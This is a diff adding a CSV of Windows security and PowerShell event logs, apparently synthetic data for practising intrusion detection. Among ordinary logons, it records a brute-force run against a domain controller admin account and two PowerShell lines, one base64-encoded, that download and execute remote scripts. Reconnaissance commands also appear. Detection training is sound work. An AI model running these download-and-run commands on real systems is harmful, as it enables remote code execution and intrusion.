@@ -1,0 +1,33 @@
+timestamp_utc,host,user,event_id,log_channel,source_ip,process_name,command_line,outcome,details
+2024-03-04T08:15:23Z,WKS-001,jdoe,4624,Security,10.0.1.50,,,success,Successful logon - Interactive
+2024-03-04T08:22:11Z,WKS-002,asmith,4624,Security,10.0.1.51,,,success,Successful logon - Interactive
+2024-03-04T09:45:33Z,WKS-001,jdoe,4688,Security,,notepad.exe,C:\Windows\System32\notepad.exe,success,Process created
+2024-03-04T10:12:05Z,SRV-DC01,admin,4625,Security,192.168.100.45,,,failure,Failed logon - Bad password
+2024-03-04T10:12:18Z,SRV-DC01,admin,4625,Security,192.168.100.45,,,failure,Failed logon - Bad password
+2024-03-04T10:12:31Z,SRV-DC01,admin,4625,Security,192.168.100.45,,,failure,Failed logon - Bad password
+2024-03-04T10:12:44Z,SRV-DC01,admin,4625,Security,192.168.100.45,,,failure,Failed logon - Bad password
+2024-03-04T10:12:57Z,SRV-DC01,admin,4625,Security,192.168.100.45,,,failure,Failed logon - Bad password
+2024-03-04T10:13:10Z,SRV-DC01,admin,4624,Security,192.168.100.45,,,success,Successful logon - Network
+2024-03-04T10:15:22Z,WKS-002,asmith,4688,Security,,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,success,Process created
+2024-03-04T10:18:45Z,WKS-001,jdoe,4688,Security,,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,success,Process created
+2024-03-04T11:23:17Z,WKS-002,bwilson,4625,Security,10.0.1.51,,,failure,Failed logon - Bad password
+2024-03-04T11:23:29Z,WKS-002,bwilson,4624,Security,10.0.1.51,,,success,Successful logon - Interactive
+2024-03-04T11:45:08Z,SRV-DC01,admin,4688,Security,,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -ExecutionPolicy Bypass,success,Process created
+2024-03-04T11:45:09Z,SRV-DC01,admin,,PowerShell,,powershell.exe,powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAMAAwAC4ANAA1AC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=,success,PowerShell script block logged
+2024-03-04T11:47:33Z,WKS-001,jdoe,4688,Security,,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,success,Process created
+2024-03-04T12:05:19Z,WKS-002,asmith,4688,Security,,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,success,Process created
+2024-03-04T12:05:20Z,WKS-002,asmith,,PowerShell,,powershell.exe,powershell.exe Get-Process | Where-Object {$_.CPU -gt 100},success,PowerShell script block logged
+2024-03-04T12:22:47Z,WKS-001,jdoe,4634,Security,,,,,Logoff event
+2024-03-04T13:10:55Z,SRV-DC01,svc_backup,4624,Security,10.0.2.10,,,success,Successful logon - Service
+2024-03-04T13:15:08Z,WKS-002,bwilson,4688,Security,,cmd.exe,C:\Windows\System32\cmd.exe /c ipconfig /all,success,Process created
+2024-03-04T14:08:22Z,SRV-DC01,admin,4688,Security,,net.exe,C:\Windows\System32\net.exe user /domain,success,Process created
+2024-03-04T14:22:11Z,WKS-001,jdoe,4624,Security,10.0.1.50,,,success,Successful logon - Interactive
+2024-03-04T14:35:44Z,WKS-002,asmith,4688,Security,,teams.exe,C:\Users\asmith\AppData\Local\Microsoft\Teams\current\Teams.exe,success,Process created
+2024-03-04T15:12:33Z,SRV-DC01,admin,,PowerShell,,powershell.exe,powershell.exe -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://192.168.100.45/malicious.ps1'),success,PowerShell script block logged
+2024-03-04T15:18:09Z,WKS-001,jdoe,4688,Security,,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,success,Process created
+2024-03-04T15:18:10Z,WKS-001,jdoe,,PowerShell,,powershell.exe,powershell.exe Get-EventLog -LogName Security -Newest 100,success,PowerShell script block logged
+2024-03-04T15:45:27Z,WKS-002,bwilson,4634,Security,,,,,Logoff event
+2024-03-04T16:03:14Z,SRV-DC01,admin,4688,Security,,reg.exe,C:\Windows\System32\reg.exe query HKLM\Software,success,Process created
+2024-03-04T16:22:55Z,WKS-001,jdoe,4688,Security,,firefox.exe,C:\Program Files\Mozilla Firefox\firefox.exe,success,Process created
+2024-03-04T17:10:08Z,WKS-002,asmith,4634,Security,,,,,Logoff event
+2024-03-04T17:15:33Z,SRV-DC01,admin,4634,Security,,,,,Logoff event
